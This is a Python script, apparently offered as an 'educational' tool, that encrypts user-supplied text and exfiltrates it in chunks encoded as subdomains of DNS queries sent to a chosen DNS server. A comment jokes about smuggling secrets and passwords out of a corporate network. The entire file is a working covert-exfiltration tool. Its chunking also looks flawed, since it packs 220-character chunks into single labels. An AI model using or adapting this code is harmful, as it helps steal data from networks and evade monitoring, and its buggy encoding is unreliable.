"""
Author      : AnyGuy
Date        : 2023-09-02

Title       : dns.py

Description : Send data to a DNS server using DNS queries. This can be used to exfiltrate data from a network using DNS.
    
    - No external libraries are used
    - This is only for educational purposes !

"""
# text
# This is a secret message from the corporate network of the CIA to the FBI. We are exfiltrating data using DNS and python. SECRETS ARE FUN! PASSWORDS ARE COOL!


# Import Libraries
import socket
import struct
import time
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64

def encrypt_data(data, passphrase):
    """
    Encrypt the given data using AES encryption with the provided passphrase.
    """
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(passphrase.encode())
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data.encode()) + encryptor.finalize()
    return base64.b64encode(salt + iv + encrypted_data).decode('utf-8')

def create_dns_query(domain, qtype=1, qclass=1):
    """
    Create a DNS query for the given domain, query type, and query class.
    """
    # Transaction ID
    tid = 0x1234

    # Flags: Standard query
    flags = 0x0100

    # Question Count
    qdcount = 1

    # Answer, Authority, and Additional counts are 0 for a query
    ancount, nscount, arcount = 0, 0, 0

    # Convert domain to DNS format (e.g., www.google.com -> 3www6google3com0)
    parts = domain.split('.')
    dns_name = b''
    for part in parts:
        dns_name += struct.pack('B', len(part)) + part.encode()

    # Null terminator
    dns_name += b'\x00'

    query = struct.pack('!HHHHHH', tid, flags, qdcount, ancount, nscount, arcount)
    query += dns_name

    # Query type and class
    query += struct.pack('!HH', qtype, qclass)

    return query

def print_progress_bar(iteration, total, bar_length=50):
    """
    Print a progress bar to the terminal.
    """
    progress = (iteration / total)
    arrow = '#' * int(round(progress * bar_length) - 1)
    spaces = ' ' * (bar_length - len(arrow))

    print(f"\rProgress: [{arrow}{spaces}] {int(progress * 100)}%", end='')

def send_text_as_dns(text, dns_server):
    """
    Send the given text to the specified DNS server, breaking it into chunks if necessary.
    """
    # Max size for domain name is 253 characters
    # Subtracting some for our custom subdomain and TLD
    MAX_SIZE = 220

    chunks = [text[i:i+MAX_SIZE] for i in range(0, len(text), MAX_SIZE)]
    total_iterations = len(chunks) * 10

    print(f"\nSending data to {dns_server}...\n")

    iteration = 0
    for i, chunk in enumerate(chunks):
        domain = f"{chunk}.customTLD"
        query = create_dns_query(domain)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            for _ in range(10):
                s.sendto(query, (dns_server, 53))
                iteration += 1
                print_progress_bar(iteration, total_iterations)
                time.sleep(0.1)
        print(f"\nSent chunk {i + 1} of {len(chunks)}")

if __name__ == '__main__':
    text = input("Please enter the text to be sent: ")
    passphrase = input("Please enter a passphrase to encrypt the data: ")
    encrypted_text = encrypt_data(text, passphrase)
    dns_server = input("Please enter the destination DNS server (e.g., 8.8.8.8): ")
    send_text_as_dns(encrypted_text, dns_server)